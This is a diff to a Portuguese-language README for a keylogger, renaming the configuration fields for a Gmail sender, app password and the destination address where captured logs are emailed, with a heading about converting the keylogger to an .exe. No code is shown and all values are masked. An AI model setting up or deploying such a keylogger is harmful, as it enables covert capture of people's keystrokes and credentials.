@@ -28,9 +28,9 @@ pip install secure-smtplib
 No arquivo Python, substitua os campos com `*****` pelas suas informações:
 
 ```python
-EMAIL_REMETENTE = "************@gmail.com"  # Substitua pelo seu e-mail
-SENHA_APP = "************"                     # Substitua pela senha do app
-EMAIL_DESTINO = "*****************@gmail.com"     # Para onde os logs serão enviados
+sender_email = "************@gmail.com"  # Substitua pelo seu e-mail
+app_password = "************"                     # Substitua pela senha do app
+destination_email = "*****************@gmail.com"     # Para onde os logs serão enviados
 ````
 
 ### 💻 Opcional: Converter o keylogger em .exe
